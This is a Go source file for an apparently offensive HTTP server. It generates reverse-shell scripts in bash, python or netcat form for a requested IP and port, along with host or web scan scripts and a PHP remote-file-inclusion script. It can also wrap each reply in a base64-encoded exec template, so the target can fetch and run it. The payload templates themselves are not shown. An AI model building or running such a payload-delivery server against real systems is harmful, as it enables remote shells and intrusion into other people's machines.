/* the simple HTTP RESTFul API server */
package shell

import (
	"bytes"
	"encoding/base64"
	"net/http"
	"regexp"
	"strconv"
	"strings"
	"text/template"

	_ "embed"
)

const (
	KEY_FORMAT = "format"
	KEY_ENCODE = "encode"
	KEY_TARGET = "t"

	KEY_FMT_PYTHON = "python"
	KEY_FMT_BASH   = "bash"
	KEY_FMT_NETCAT = "netcat"
	KEY_FMT_WEB    = "web"

	KEY_ENCODE_BASE64 = "base64"
)

//go:embed assets/exec-base64
var tmplExecBase64 string

var (
	RE_REVERSED     = regexp.MustCompile(`^/reversed(?:/(\d+\.\d+\.\d+\.\d+):(\d+))?$`)
	RE_SCAN         = regexp.MustCompile(`^/scan$`)
	RE_SCRIPT       = regexp.MustCompile(`^/script/(phprfi)(?:/[\S]*)$`)
	RE_BASH_COMMENT = regexp.MustCompile(`#.*?\n`)
)

func (shell *Shell) ListenAndServe() {
	shell.Logger.Info("listen and serve on %#v", *shell.Bind)
	if err := http.ListenAndServe(*shell.Bind, shell); err != nil {
		shell.Logger.Crit("server failure: %v", err)
		return
	}
}

func (shell *Shell) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	shell.Logger.Info("serve %-22s [%s] %s", r.RemoteAddr, r.Method, r.URL)

	// always set the header as text/plain
	w.Header().Add("Content-Type", "text/plain")

	// the query PATH
	var data []byte
	path := r.URL.EscapedPath()
	shell.Logger.Debug("process the PATH: %#v", path)

	var generator Generator
	switch {
	case RE_REVERSED.MatchString(path):
		match := RE_REVERSED.FindStringSubmatch(path)
		agent := &ReversedShell{}

		switch format := r.URL.Query()[KEY_FORMAT]; strings.Join(format, "") {
		case KEY_FMT_BASH:
			agent.Bash = true
		case KEY_FMT_PYTHON:
			agent.Python = true
		case KEY_FMT_NETCAT:
			agent.NetCat = true
		}

		if agent.IP = match[1]; agent.IP == "" {
			agent.IP = "127.0.0.1"
		}

		if agent.Port, _ = strconv.Atoi(match[2]); agent.Port == 0 {
			agent.Port = 5566
		}

		generator = agent
	case RE_SCAN.MatchString(path):
		agent := &Scan{}
		agent.IPHost = strings.Join(r.URL.Query()[KEY_TARGET], "")
		if agent.IPHost == "" {
			agent.IPHost = "127.0.0.1"
		}
		switch format := r.URL.Query()[KEY_FORMAT]; strings.Join(format, "") {
		case KEY_FMT_WEB:
			agent.Web = true
		}

		generator = agent
	case RE_SCRIPT.MatchString(path):
		agent := &Script{}
		agent.PHPRFI = true

		generator = agent
	default:
		generator = shell
	}

	data, _ = generator.Generate(shell.Logger)
	// reply the shell script
	w.Write(shell.Encode(data, strings.Join(r.URL.Query()[KEY_ENCODE], "")))
}

func (shell *Shell) Encode(in []byte, encode string) (out []byte) {
	out = in

	switch encode {
	case KEY_ENCODE_BASE64:
		tmpl := template.Must(template.New("scan").Parse(tmplExecBase64))
		buff := bytes.NewBuffer(nil)

		out = RE_BASH_COMMENT.ReplaceAll(in, []byte{})
		out = bytes.Trim(out, " \r\n\t")

		// NOTE - use the URL encoding based on RFC 4648
		if err := tmpl.Execute(buff, base64.URLEncoding.EncodeToString(out)); err != nil {
			shell.Logger.Warn("cannot parse template: %v", err)
			return
		}

		out = buff.Bytes()
	}

	return
}
